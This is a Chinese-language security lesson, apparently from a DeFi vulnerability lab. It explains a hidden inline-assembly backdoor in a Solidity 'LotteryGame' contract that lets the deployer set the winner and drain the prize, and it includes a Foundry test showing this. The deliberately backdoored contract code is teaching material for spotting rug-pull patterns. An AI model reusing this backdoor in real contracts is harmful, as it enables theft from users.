# 合约中隐藏的后门  
[Backdoor-assembly.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Backdoor-assembly.sol)  
**名称：** 合约中隐藏后门漏洞  
**描述：**   
在这份合同中，一个看似公平的“LotteryGame”合约被巧妙地设计为允许
合同部署者/管理员拥有隐藏特权。  
这是通过使用汇编级的访问来存储变量，其中一个“referee”函数被设计为提供了一个管理后门。  
“pickWinner”函数似乎是随机选择一个赢家，但实际上它允许管理员设置赢家。  
这绕过了通常的访问控制，可以被未经授权的用户用来从奖池中提取资金，类似于rug pull的操作。  

攻击者可以通过编写内联汇编来操纵智能合约，以实现后门功能。任何敏感的参数都可以随时被更改。  


**场景：**  
抽奖游戏：任何人都可以调用pickWinner函数，如果你幸运的话，就能获得奖金。  
参考JST合约的后门。许多rugged的合约都有类似的模式。
合约中似乎没有setWinner函数，管理员如何进行rug操作呢？  

**LotteryGame合约：**  
```
contract LotteryGame {
    uint256 public prize = 1000;
    address public winner;
    address public admin = msg.sender;

    modifier safeCheck() {
        if (msg.sender == referee()) {
            _;
        } else {
            getkWinner();
        }
    }

    function referee() internal view returns (address user) {
        assembly {
            //读取存储在插槽2上的管理员地址
            user := sload(2)
        }
    }

    function pickWinner(address random) public safeCheck {
        assembly {
            // 管理员后门，可以设置赢家地址
            sstore(1, random)
        }
    }

    function getkWinner() public view returns (address) {
        console.log("Current winner: ", winner);
        return winner;
    }
}
```  
**如何测试：**  
forge test --contracts src/test/**Backdoor-assembly.sol** -vvvv
```
// 定义一个名为 testBackdoorCall 的公共函数
function testBackdoorCall() public {
    // 声明两个地址，alice和bob，并将它们的值设置为分别从vm.addr(1)和vm.addr(2)的地址。
    address alice = vm.addr(1);
    address bob = vm.addr(2);

    // 部署LotteryGame合约的新实例，并将引用存储在LotteryGameContract变量中。
    LotteryGameContract = new LotteryGame();

    // 打印一条消息，指示Alice将调用pickWinner函数，但她实际上不会是赢家。
    console.log("Alice performs pickWinner, of course she will not be a winner");

    // 调用vm的prank函数，以Alice的地址作为参数，暗示可能进行一些操作。
    vm.prank(alice);

    // 调用LotteryGameContract的pickWinner函数，将Alice的地址作为参数传递。
    LotteryGameContract.pickWinner(address(alice));

    // 在pickWinner函数调用后，打印当前抽奖奖金的金额。
    console.log("Prize: ", LotteryGameContract.prize());

    // 印一条消息，表示管理员将设置赢家以取走奖金。
    console.log("Now, admin sets the winner to drain out the prize.");

    // 再次调用LotteryGameContract的pickWinner函数，但这次将 Bob的地址作为参数传递。。
    LotteryGameContract.pickWinner(address(bob));

    // 打印管理员通过操纵设置的赢家地址。
    console.log("Admin manipulated winner: ", LotteryGameContract.winner());
```  
**红框：** 恶意设置的赢家可以中奖。
![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc89ca10c-c526-479d-83f5-a7f798142b42%2FUntitled.png?table=block&id=65b900de-4ff0-4ffa-8685-071dd4112db5&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)